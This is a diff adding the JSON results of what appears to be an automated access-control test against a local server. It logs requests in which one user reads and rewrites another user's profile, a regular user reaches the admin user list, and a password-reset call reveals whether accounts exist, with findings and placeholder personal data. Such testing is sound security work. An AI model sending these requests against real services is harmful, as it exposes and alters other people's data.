@@ -1,0 +1,200 @@
+{
+  "name": "idor-read-check",
+  "steps": [
+    {
+      "id": "login_userA",
+      "status_code": 200,
+      "request": {
+        "url": "http://127.0.0.1:9001/login",
+        "method": "POST",
+        "body": {
+          "username": "userA",
+          "password": "Password123"
+        },
+        "headers": {}
+      },
+      "response": {
+        "token": "tokenA",
+        "user_id": 1
+      },
+      "ok": true
+    },
+    {
+      "id": "login_userB",
+      "status_code": 200,
+      "request": {
+        "url": "http://127.0.0.1:9001/login",
+        "method": "POST",
+        "body": {
+          "username": "userB",
+          "password": "Password123"
+        },
+        "headers": {}
+      },
+      "response": {
+        "token": "tokenB",
+        "user_id": 2
+      },
+      "ok": true
+    },
+    {
+      "id": "userB_access_userA_profile",
+      "status_code": 200,
+      "request": {
+        "url": "http://127.0.0.1:9001/users/1/profile",
+        "method": "GET",
+        "body": null,
+        "headers": {
+          "Authorization": "Bearer tokenB"
+        }
+      },
+      "response": {
+        "id": 1,
+        "name": "Alice",
+        "email": "alice@example.com",
+        "ssn": "123-45-6789"
+      },
+      "ok": true
+    },
+    {
+      "id": "userB_modify_userA_profile",
+      "status_code": 200,
+      "request": {
+        "url": "http://127.0.0.1:9001/users/1/profile",
+        "method": "PUT",
+        "body": {
+          "email": "hacked@example.com",
+          "name": "Hacked User"
+        },
+        "headers": {
+          "Authorization": "Bearer tokenB"
+        }
+      },
+      "response": {
+        "message": "Profile updated",
+        "profile": {
+          "id": 1,
+          "name": "Hacked User",
+          "email": "hacked@example.com",
+          "ssn": "123-45-6789"
+        }
+      },
+      "ok": true
+    },
+    {
+      "id": "regular_user_access_admin",
+      "status_code": 200,
+      "request": {
+        "url": "http://127.0.0.1:9001/admin/users",
+        "method": "GET",
+        "body": null,
+        "headers": {
+          "Authorization": "Bearer tokenA"
+        }
+      },
+      "response": {
+        "users": [
+          {
+            "id": 1,
+            "name": "Hacked User",
+            "email": "hacked@example.com",
+            "ssn": "123-45-6789"
+          },
+          {
+            "id": 2,
+            "name": "Bob",
+            "email": "bob@example.com",
+            "ssn": "987-65-4321"
+          }
+        ]
+      },
+      "ok": true
+    },
+    {
+      "id": "user_enumeration",
+      "status_code": 200,
+      "request": {
+        "url": "http://127.0.0.1:9001/reset-password",
+        "method": "POST",
+        "body": {
+          "username": "nonexistentuser"
+        },
+        "headers": {}
+      },
+      "response": {
+        "message": "User not found"
+      },
+      "ok": true
+    }
+  ],
+  "context": {
+    "tokenA": "tokenA",
+    "user_id_A": 1,
+    "tokenB": "tokenB",
+    "user_id_B": 2,
+    "stolen_data": {
+      "id": 1,
+      "name": "Alice",
+      "email": "alice@example.com",
+      "ssn": "123-45-6789"
+    },
+    "modification_result": {
+      "message": "Profile updated",
+      "profile": {
+        "id": 1,
+        "name": "Hacked User",
+        "email": "hacked@example.com",
+        "ssn": "123-45-6789"
+      }
+    },
+    "admin_data": {
+      "users": [
+        {
+          "id": 1,
+          "name": "Hacked User",
+          "email": "hacked@example.com",
+          "ssn": "123-45-6789"
+        },
+        {
+          "id": 2,
+          "name": "Bob",
+          "email": "bob@example.com",
+          "ssn": "987-65-4321"
+        }
+      ]
+    },
+    "reset_response": {
+      "message": "User not found"
+    }
+  },
+  "findings": [
+    {
+      "type": "IDOR",
+      "severity": "high",
+      "description": "User B can access User A's profile data",
+      "step_id": "userB_access_userA_profile",
+      "evidence": "User B successfully accessed User A's profile: {'id': 1, 'name': 'Alice', 'email': 'alice@example.com', 'ssn': '123-45-6789'}"
+    },
+    {
+      "type": "IDOR",
+      "severity": "high",
+      "description": "User B can modify User A's profile data",
+      "step_id": "userB_modify_userA_profile",
+      "evidence": "User B successfully modified User A's profile: {'message': 'Profile updated', 'profile': {'id': 1, 'name': 'Hacked User', 'email': 'hacked@example.com', 'ssn': '123-45-6789'}}"
+    },
+    {
+      "type": "Broken Access Control",
+      "severity": "high",
+      "description": "Regular user can access admin endpoint",
+      "step_id": "regular_user_access_admin",
+      "evidence": "Regular user accessed admin data: {'users': [{'id': 1, 'name': 'Hacked User', 'email': 'hacked@example.com', 'ssn': '123-45-6789'}, {'id': 2, 'name': 'Bob', 'email': 'bob@example.com', 'ssn': '987-65-4321'}]}"
+    },
+    {
+      "type": "Information Disclosure",
+      "severity": "medium",
+      "description": "User enumeration vulnerability - reveals if user exists",
+      "step_id": "user_enumeration",
+      "evidence": "Response reveals user doesn't exist: {'message': 'User not found'}"
+    }
+  ]
+}
